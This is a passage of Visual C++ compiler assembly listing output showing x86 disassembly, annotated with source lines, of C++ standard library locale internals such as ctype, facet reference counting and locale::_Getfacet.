__Refs$ = 12						; size = 4
??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z PROC		; std::ctype<char>::ctype<char>, COMDAT
; _this$ = ecx

; 2713 :     __CLR_OR_THIS_CALL ctype(const _Locinfo& _Lobj, size_t _Refs = 0) : ctype_base(_Refs) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR __Refs$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0ctype_base@std@@QAE@I@Z ; std::ctype_base::ctype_base
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7?$ctype@D@std@@6B@

; 2714 :         _Init(_Lobj);

  0001c	8b 55 08	 mov	 edx, DWORD PTR __Lobj$[ebp]
  0001f	52		 push	 edx
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ?_Init@?$ctype@D@std@@IAEXABV_Locinfo@2@@Z ; std::ctype<char>::_Init

; 2715 :     }

  00028	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0002b	8b e5		 mov	 esp, ebp
  0002d	5d		 pop	 ebp
  0002e	c2 08 00	 ret	 8
??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z ENDP		; std::ctype<char>::ctype<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?widen@?$ctype@D@std@@QBEDD@Z
_TEXT	SEGMENT
tv70 = -8						; size = 4
_this$ = -4						; size = 4
__Byte$ = 8						; size = 1
?widen@?$ctype@D@std@@QBEDD@Z PROC			; std::ctype<char>::widen, COMDAT
; _this$ = ecx

; 2676 :     _Elem __CLR_OR_THIS_CALL widen(char _Byte) const { // widen char

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2677 :         return do_widen(_Byte);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000e	8b 51 20	 mov	 edx, DWORD PTR [ecx+32]
  00011	89 55 f8	 mov	 DWORD PTR tv70[ebp], edx
  00014	0f b6 45 08	 movzx	 eax, BYTE PTR __Byte$[ebp]
  00018	50		 push	 eax
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	ff 55 f8	 call	 DWORD PTR tv70[ebp]

; 2678 :     }

  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
?widen@?$ctype@D@std@@QBEDD@Z ENDP			; std::ctype<char>::widen
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gctype_base@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gctype_base@std@@UAEPAXI@Z PROC			; std::ctype_base::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1ctype_base@std@@UAE@XZ ; std::ctype_base::~ctype_base
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 08		 push	 8
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gctype_base@std@@UAEPAXI@Z ENDP			; std::ctype_base::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??1ctype_base@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1ctype_base@std@@UAE@XZ PROC				; std::ctype_base::~ctype_base, COMDAT
; _this$ = ecx

; 2372 :     __CLR_OR_THIS_CALL ~ctype_base() noexcept override {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7ctype_base@std@@6B@
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ??1facet@locale@std@@MAE@XZ ; std::locale::facet::~facet
  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
??1ctype_base@std@@UAE@XZ ENDP				; std::ctype_base::~ctype_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??0ctype_base@std@@QAE@I@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Refs$ = 8						; size = 4
??0ctype_base@std@@QAE@I@Z PROC				; std::ctype_base::ctype_base, COMDAT
; _this$ = ecx

; 2369 :     __CLR_OR_THIS_CALL ctype_base(size_t _Refs = 0) noexcept // strengthened

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2370 :         : locale::facet(_Refs) {}

  00007	8b 45 08	 mov	 eax, DWORD PTR __Refs$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0facet@locale@std@@IAE@I@Z ; std::locale::facet::facet
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7ctype_base@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0ctype_base@std@@QAE@I@Z ENDP				; std::ctype_base::ctype_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z PROC	; std::_Adl_verify_range<wchar_t const *,wchar_t const *>, COMDAT

; 1162 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1163 :     // check that [_First, _Last) forms an iterator range
; 1164 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1165 :         _Verify_range(_First, _Last);
; 1166 :     }
; 1167 : }

  00003	5d		 pop	 ebp
  00004	c3		 ret	 0
??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z ENDP	; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z PROC	; std::_Adl_verify_range<char const *,char const *>, COMDAT

; 1162 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1163 :     // check that [_First, _Last) forms an iterator range
; 1164 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1165 :         _Verify_range(_First, _Last);
; 1166 :     }
; 1167 : }

  00003	5d		 pop	 ebp
  00004	c3		 ret	 0
??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z ENDP	; std::_Adl_verify_range<char const *,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z
_TEXT	SEGMENT
__Ptr0$ = -16						; size = 4
__Facptr$ = -12						; size = 4
tv71 = -8						; size = 4
_this$ = -4						; size = 4
__Id$ = 8						; size = 4
?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z PROC		; std::locale::_Getfacet, COMDAT
; _this$ = ecx

; 362  :     const facet* _Getfacet(size_t _Id) const { // look up a facet in locale object

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 363  :         const facet* _Facptr = _Id < _Ptr->_Facetcount ? _Ptr->_Facetvec[_Id] : nullptr; // null if id off end

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0000f	8b 55 08	 mov	 edx, DWORD PTR __Id$[ebp]
  00012	3b 51 0c	 cmp	 edx, DWORD PTR [ecx+12]
  00015	73 14		 jae	 SHORT $LN6@Getfacet
  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0001d	8b 51 08	 mov	 edx, DWORD PTR [ecx+8]
  00020	8b 45 08	 mov	 eax, DWORD PTR __Id$[ebp]
  00023	8b 0c 82	 mov	 ecx, DWORD PTR [edx+eax*4]
  00026	89 4d f8	 mov	 DWORD PTR tv71[ebp], ecx
  00029	eb 07		 jmp	 SHORT $LN7@Getfacet
$LN6@Getfacet:
  0002b	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv71[ebp], 0
$LN7@Getfacet:
  00032	8b 55 f8	 mov	 edx, DWORD PTR tv71[ebp]
  00035	89 55 f4	 mov	 DWORD PTR __Facptr$[ebp], edx

; 364  :         if (_Facptr || !_Ptr->_Xparent) {

  00038	83 7d f4 00	 cmp	 DWORD PTR __Facptr$[ebp], 0
  0003c	75 0e		 jne	 SHORT $LN3@Getfacet
  0003e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00041	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00044	0f b6 51 14	 movzx	 edx, BYTE PTR [ecx+20]
  00048	85 d2		 test	 edx, edx
  0004a	75 05		 jne	 SHORT $LN2@Getfacet
$LN3@Getfacet:

; 365  :             return _Facptr; // found facet or not transparent

  0004c	8b 45 f4	 mov	 eax, DWORD PTR __Facptr$[ebp]
  0004f	eb 23		 jmp	 SHORT $LN1@Getfacet
$LN2@Getfacet:

; 366  :         }
; 367  : 
; 368  :         // look in current locale
; 369  :         locale::_Locimp* _Ptr0 = _Getgloballocale();

  00051	e8 00 00 00 00	 call	 ?_Getgloballocale@locale@std@@CAPAV_Locimp@12@XZ ; std::locale::_Getgloballocale
  00056	89 45 f0	 mov	 DWORD PTR __Ptr0$[ebp], eax

; 370  :         if (_Id < _Ptr0->_Facetcount) {

  00059	8b 45 f0	 mov	 eax, DWORD PTR __Ptr0$[ebp]
  0005c	8b 4d 08	 mov	 ecx, DWORD PTR __Id$[ebp]
  0005f	3b 48 0c	 cmp	 ecx, DWORD PTR [eax+12]
  00062	73 0e		 jae	 SHORT $LN4@Getfacet

; 371  :             return _Ptr0->_Facetvec[_Id]; // get from current locale

  00064	8b 55 f0	 mov	 edx, DWORD PTR __Ptr0$[ebp]
  00067	8b 42 08	 mov	 eax, DWORD PTR [edx+8]
  0006a	8b 4d 08	 mov	 ecx, DWORD PTR __Id$[ebp]
  0006d	8b 04 88	 mov	 eax, DWORD PTR [eax+ecx*4]
  00070	eb 02		 jmp	 SHORT $LN1@Getfacet
$LN4@Getfacet:

; 372  :         }
; 373  : 
; 374  :         return nullptr; // no entry in current locale

  00072	33 c0		 xor	 eax, eax
$LN1@Getfacet:

; 375  :     }

  00074	8b e5		 mov	 esp, ebp
  00076	5d		 pop	 ebp
  00077	c2 04 00	 ret	 4
?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z ENDP		; std::locale::_Getfacet
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_C_str@locale@std@@QBEPBDXZ
_TEXT	SEGMENT
tv70 = -8						; size = 4
_this$ = -4						; size = 4
?_C_str@locale@std@@QBEPBDXZ PROC			; std::locale::_C_str, COMDAT
; _this$ = ecx

; 358  :     _Ret_z_ const char* _C_str() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 359  :         return _Ptr ? _Ptr->_Name.c_str() : "";

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  00010	74 13		 je	 SHORT $LN3@C_str
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	8b 49 04	 mov	 ecx, DWORD PTR [ecx+4]
  00018	83 c1 18	 add	 ecx, 24			; 00000018H
  0001b	e8 00 00 00 00	 call	 ?c_str@?$_Yarn@D@std@@QBEPBDXZ ; std::_Yarn<char>::c_str
  00020	89 45 f8	 mov	 DWORD PTR tv70[ebp], eax
  00023	eb 07		 jmp	 SHORT $LN4@C_str
$LN3@C_str:
  00025	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv70[ebp], OFFSET ??_C@_00CNPNBAHC@@
$LN4@C_str:
  0002c	8b 45 f8	 mov	 eax, DWORD PTR tv70[ebp]

; 360  :     }

  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c3		 ret	 0
?_C_str@locale@std@@QBEPBDXZ ENDP			; std::locale::_C_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??1locale@std@@QAE@XZ
_TEXT	SEGMENT
tv86 = -16						; size = 4
tv85 = -12						; size = 4
$T1 = -8						; size = 4
_this$ = -4						; size = 4
??1locale@std@@QAE@XZ PROC				; std::locale::~locale, COMDAT
; _this$ = ecx

; 339  :     ~locale() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 340  :         if (_Ptr) {

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  00010	74 3a		 je	 SHORT $LN5@locale

; 341  :             delete _Ptr->_Decref();

  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	8b 12		 mov	 edx, DWORD PTR [edx]
  0001d	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00020	8b 42 08	 mov	 eax, DWORD PTR [edx+8]
  00023	ff d0		 call	 eax
  00025	89 45 f8	 mov	 DWORD PTR $T1[ebp], eax
  00028	83 7d f8 00	 cmp	 DWORD PTR $T1[ebp], 0
  0002c	74 17		 je	 SHORT $LN4@locale
  0002e	8b 4d f8	 mov	 ecx, DWORD PTR $T1[ebp]
  00031	8b 11		 mov	 edx, DWORD PTR [ecx]
  00033	8b 02		 mov	 eax, DWORD PTR [edx]
  00035	89 45 f4	 mov	 DWORD PTR tv85[ebp], eax
  00038	6a 01		 push	 1
  0003a	8b 4d f8	 mov	 ecx, DWORD PTR $T1[ebp]
  0003d	ff 55 f4	 call	 DWORD PTR tv85[ebp]
  00040	89 45 f0	 mov	 DWORD PTR tv86[ebp], eax
  00043	eb 07		 jmp	 SHORT $LN5@locale
$LN4@locale:
  00045	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR tv86[ebp], 0
$LN5@locale:

; 342  :         }
; 343  :     }

  0004c	8b e5		 mov	 esp, ebp
  0004e	5d		 pop	 ebp
  0004f	c3		 ret	 0
??1locale@std@@QAE@XZ ENDP				; std::locale::~locale
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??0locale@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??0locale@std@@QAE@ABV01@@Z PROC			; std::locale::locale, COMDAT
; _this$ = ecx

; 254  :     locale(const locale& _Right) noexcept : _Ptr(_Right._Ptr) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0000d	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  00010	89 50 04	 mov	 DWORD PTR [eax+4], edx

; 255  :         _Ptr->_Incref();

  00013	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00016	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00019	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0001c	8b 01		 mov	 eax, DWORD PTR [ecx]
  0001e	8b 4a 04	 mov	 ecx, DWORD PTR [edx+4]
  00021	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00024	ff d2		 call	 edx

; 256  :     }

  00026	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c2 04 00	 ret	 4
??0locale@std@@QAE@ABV01@@Z ENDP			; std::locale::locale
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gfacet@locale@std@@MAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gfacet@locale@std@@MAEPAXI@Z PROC			; std::locale::facet::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1facet@locale@std@@MAE@XZ ; std::locale::facet::~facet
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 08		 push	 8
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gfacet@locale@std@@MAEPAXI@Z ENDP			; std::locale::facet::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??1facet@locale@std@@MAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1facet@locale@std@@MAE@XZ PROC			; std::locale::facet::~facet, COMDAT
; _this$ = ecx

; 132  :         __CLR_OR_THIS_CALL ~facet() noexcept override {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7facet@locale@std@@6B@
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ??1_Facet_base@std@@UAE@XZ ; std::_Facet_base::~_Facet_base
  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
??1facet@locale@std@@MAE@XZ ENDP			; std::locale::facet::~facet
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??0facet@locale@std@@IAE@I@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Initrefs$ = 8						; size = 4
??0facet@locale@std@@IAE@I@Z PROC			; std::locale::facet::facet, COMDAT
; _this$ = ecx

; 130  :         {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0_Facet_base@std@@QAE@XZ
  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7facet@locale@std@@6B@

; 129  :             : _Myrefs(static_cast<_Atomic_counter_t>(_Initrefs)) // non-atomic initialization

  00018	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	8b 55 08	 mov	 edx, DWORD PTR __Initrefs$[ebp]
  0001e	89 51 04	 mov	 DWORD PTR [ecx+4], edx

; 130  :         {}

  00021	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c2 04 00	 ret	 4
??0facet@locale@std@@IAE@I@Z ENDP			; std::locale::facet::facet
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ PROC	; std::locale::facet::_Decref, COMDAT
; _this$ = ecx

; 116  :         _Facet_base* __CLR_OR_THIS_CALL _Decref() noexcept override { // decrement use count

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 117  :             if (_MT_DECR(_Myrefs) == 0) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 04	 add	 eax, 4
  0000d	83 c9 ff	 or	 ecx, -1
  00010	f0 0f c1 08	 lock	  xadd	 DWORD PTR [eax], ecx
  00014	49		 dec	 ecx
  00015	75 05		 jne	 SHORT $LN2@Decref

; 118  :                 return this;

  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	eb 02		 jmp	 SHORT $LN1@Decref
$LN2@Decref:

; 119  :             }
; 120  : 
; 121  :             return nullptr;

  0001c	33 c0		 xor	 eax, eax
$LN1@Decref:

; 122  :         }

  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c3		 ret	 0
?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ ENDP	; std::locale::facet::_Decref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_Incref@facet@locale@std@@UAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Incref@facet@locale@std@@UAEXXZ PROC			; std::locale::facet::_Incref, COMDAT
; _this$ = ecx

; 112  :         void __CLR_OR_THIS_CALL _Incref() noexcept override { // increment use count

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 113  :             _MT_INCR(_Myrefs);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 04	 add	 eax, 4
  0000d	f0 ff 00	 lock	  inc	 DWORD PTR [eax]

; 114  :         }

  00010	8b e5		 mov	 esp, ebp
  00012	5d		 pop	 ebp
  00013	c3		 ret	 0
?_Incref@facet@locale@std@@UAEXXZ ENDP			; std::locale::facet::_Incref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??Bid@locale@std@@QAEIXZ
_TEXT	SEGMENT
__Lock$1 = -8						; size = 4
_this$ = -4						; size = 4
??Bid@locale@std@@QAEIXZ PROC				; std::locale::id::operator unsigned int, COMDAT
; _this$ = ecx

; 82   :         __CLR_OR_THIS_CALL operator size_t() { // get stamp, with lazy allocation

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 83   :             if (_Id == 0) { // still zero, allocate stamp

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 38 00	 cmp	 DWORD PTR [eax], 0
  0000f	75 34		 jne	 SHORT $LN2@operator

; 84   :                 _BEGIN_LOCK(_LOCK_LOCALE)

  00011	6a 00		 push	 0
  00013	8d 4d f8	 lea	 ecx, DWORD PTR __Lock$1[ebp]
  00016	e8 00 00 00 00	 call	 ??0_Lockit@std@@QAE@H@Z	; std::_Lockit::_Lockit

; 85   :                 if (_Id == 0) {

  0001b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001e	83 39 00	 cmp	 DWORD PTR [ecx], 0
  00021	75 1a		 jne	 SHORT $LN3@operator

; 86   :                     _Id = static_cast<size_t>(++_Id_cnt);

  00023	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?_Id_cnt@id@locale@std@@0HA ; std::locale::id::_Id_cnt
  00029	83 c2 01	 add	 edx, 1
  0002c	89 15 00 00 00
	00		 mov	 DWORD PTR ?_Id_cnt@id@locale@std@@0HA, edx ; std::locale::id::_Id_cnt
  00032	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00035	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?_Id_cnt@id@locale@std@@0HA ; std::locale::id::_Id_cnt
  0003b	89 08		 mov	 DWORD PTR [eax], ecx
$LN3@operator:

; 87   :                 }
; 88   :                 _END_LOCK()

  0003d	8d 4d f8	 lea	 ecx, DWORD PTR __Lock$1[ebp]
  00040	e8 00 00 00 00	 call	 ??1_Lockit@std@@QAE@XZ	; std::_Lockit::~_Lockit
$LN2@operator:

; 89   :             }
; 90   :             return _Id;

  00045	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00048	8b 02		 mov	 eax, DWORD PTR [edx]

; 91   :         }

  0004a	8b e5		 mov	 esp, ebp
  0004c	5d		 pop	 ebp
  0004d	c3		 ret	 0
??Bid@locale@std@@QAEIXZ ENDP				; std::locale::id::operator unsigned int
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ?_Tidy@?$_Yarn@_W@std@@AAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Tidy@?$_Yarn@_W@std@@AAEXXZ PROC			; std::_Yarn<wchar_t>::_Tidy, COMDAT
; _this$ = ecx

; 203  :     void __CLR_OR_THIS_CALL _Tidy() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 204  :         if (_Myptr) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 38 00	 cmp	 DWORD PTR [eax], 0
  0000d	74 0e		 je	 SHORT $LN2@Tidy

; 205  : #ifdef _DEBUG
; 206  :             _free_dbg(_Myptr, _CRT_BLOCK);
; 207  : #else
; 208  :             _CSTD free(_Myptr);

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
